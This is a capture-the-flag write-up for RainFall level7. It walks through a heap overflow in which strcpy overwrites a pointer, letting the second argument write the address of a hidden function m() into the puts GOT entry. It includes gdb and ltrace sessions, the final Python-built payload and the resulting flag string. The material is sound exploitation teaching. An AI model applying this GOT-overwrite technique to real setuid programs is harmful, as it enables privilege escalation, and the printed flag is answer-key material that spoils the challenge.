We are given a setuid binary that segfaults without parameters and prints ~~ when given two arguments:
```sh
level7@RainFall:~$ ./level7
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 arg
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 arg1 arg2
~~
```

From reverse engineering (via `source.c`), we know:
There's a hidden function `m()` that prints the flag.
The vulnerable code uses `strcpy()` on user inputs and allocates memory via `malloc()`.
By carefully crafting our arguments, we can perform a heap-based overwrite of a function pointer.

Step 1: Understand the Vulnerability
Inside `main()`, the code does this (simplified):
```c
int *a = malloc(8);
a[0] = 1;
a[1] = malloc(8);

int *b = malloc(8);
b[0] = 2;
b[1] = malloc(8);
strcpy((char *)a[1], argv[1]);
strcpy((char *)b[1], argv[2]);
```
Here’s what we can exploit:
The `a` and `b` variable here are both storing pointer to another heap allocated pointer.

`strcpy(a[1], argv[1])` will copy beyond the 8-byte buffer, overwriting `b[1]`’s pointer.
`strcpy(b[1], argv[2])` will then write to wherever b[1] now points — which we control.

Goal: Change the `b[1]` address to overwrite a GOT entry (e.g., puts()), replacing it with the address of function `m()` (which prints the flag).

Step 2: Find the Offset

We have 3 ways to find the Offset to know how much bytes we need to write before reaching the `b[1]` address.

1. using a cyclic pattern:
We use a cyclic pattern to discover how many bytes are needed to reach the b[1] pointer:

level7@RainFall:~$ ltrace ./level7 "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4"
__libc_start_main(0x8048521, 2, 0xbffff744, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                        = 0x0804a008
malloc(8)                                        = 0x0804a018
malloc(8)                                        = 0x0804a028
malloc(8)                                        = 0x0804a038
strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...) = 0x0804a018
strcpy(0x37614136, NULL <unfinished ...>
--- SIGSEGV (Segmentation fault) ---

"7aA6" revert to "6Aa7" is 22th in "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4"
So, after 20 bytes, we reach and control b[1].

2. Using GDB, and memory inspection:

We need to start by calling the program with two distinct arguments.
The first one will be four `A` (`0x41`), and the second one four `B` (`0x42`).

```sh
level7@RainFall:~$ gdb --args ./level7 AAAA BBBB
```

Now, we need to set a breakpointer after all the `strcpy` call.
```
(gdb) set disassembly-flavor intel # Change the output syntax to intel
(gdb) disas main
Dump of assembler code for function main:
# [...]
   0x080485ba <+153>:   mov    DWORD PTR [esp],eax
   0x080485bd <+156>:   call   0x80483e0 <strcpy@plt>
   0x080485c2 <+161>:   mov    edx,0x80486e9
# [...]
```

So we can add a beakpoint to `main + 161`, and run the program:
```
(gdb) b *main + 161
Breakpoint 1 at 0x80485c2
(gdb) r
Starting program: /home/user/level7/level7 AAAA BBBB

Breakpoint 1, 0x080485c2 in main ()
```

We now need to inspect the heap. So for that, we need to get the malloc'd addresses:
```
(gdb) i proc mappings # Get the heap location
process 2934
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
[...]
         0x804a000  0x806b000    0x21000        0x0 [heap]
[...]
(gdb) x/20xw 0x804a000
0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
0x804a010:      0x00000000      0x00000011      0x41414141      0x00000000
0x804a020:      0x00000000      0x00000011      0x00000002      0x0804a038
0x804a030:      0x00000000      0x00000011      0x42424242      0x00000000
0x804a040:      0x00000000      0x00020fc1      0x00000000      0x00000000
```

Here, we can see our `0x41414141` and `0x42424242`, and also 2 addresses:
- `0x0804a018`
- `0x0804a038`

The second one is the one that interest us. After checking how much bytes separate the `0x41414141`
(first argument), and the second address, we know that we'll need a padding of 20 bytes.

3. Maths:

Okay, so for the third part, you need to understand that malloc will always align its allocations.

Because the binary is a 32 bits binary, all alignment are made on 4 bytes.

Each allocations includes a header of 4 bytes, and a footer of 4 bytes. Which means, our `malloc(8)`
will reserve 16 bytes on the heap.

We need to smash the third allocation, from the second one.
This is an example of the memory, where `H` means `header`, `F` means footer:
```
|      Content   |  Hex  | Dec.
|        H       |  0x00 | 0
|        1       |  0x04 | 4
|       0x14     |  0x08 | 8
|        F       |  0x0c | 12
|        H       |  0x10 | 16
|       AAAA     |  0x14 | 20
|       AAAA     |  0x18 | 24
|        F       |  0x1c | 28
|        H       |  0x20 | 32
|        2       |  0x24 | 36
|       0x30     |  0x28 | 40
|        F       |  0x2c | 44
|        H       |  0x30 | 48
|       BBBB     |  0x34 | 52
|       BBBB     |  0x38 | 56
|        H       |  0x3c | 60
```

As you can see, the first data we have is at the offset 20,
and the address of the second one is located at the ofset 40.
So, we have 20 bytes to fill before writing the `puts` address on the GOT.


Step 3: Locate the GOT Entry for `puts()`
We want to overwrite the GOT entry of `puts()`:
```sh
level7@RainFall:~$ objdump -R level7 | grep puts
08049928 R_386_JUMP_SLOT   puts
```


Step 4: Find the Address of `m()`
```
(gdb) info functions m
0x080484f4  m
```
✅ Function m() is at `0x080484f4`.

Step 5: Craft the Exploit
We want to:
Overflow a (first malloc) to overwrite the pointer for `b[1]` (next malloc).
Make `b[1]` point to `puts()` GOT.
When the second `strcpy()` writes, it writes the address of `m()` to that GOT entry.
Next time `puts()` is called, `m()` will run instead — and print the flag.

Final Payload:
```sh
./level7 \
  $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') \
  $(python -c 'print "\xf4\x84\x04\x08"')
```
`\x28\x99\x04\x08` = address of `puts()` GOT entry (`0x08049928`)
`\xf4\x84\x04\x08` = address of `m()` (`0x080484f4`)

Step 6: Exploit and Get the Flag
```sh
level7@RainFall:~$ ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```
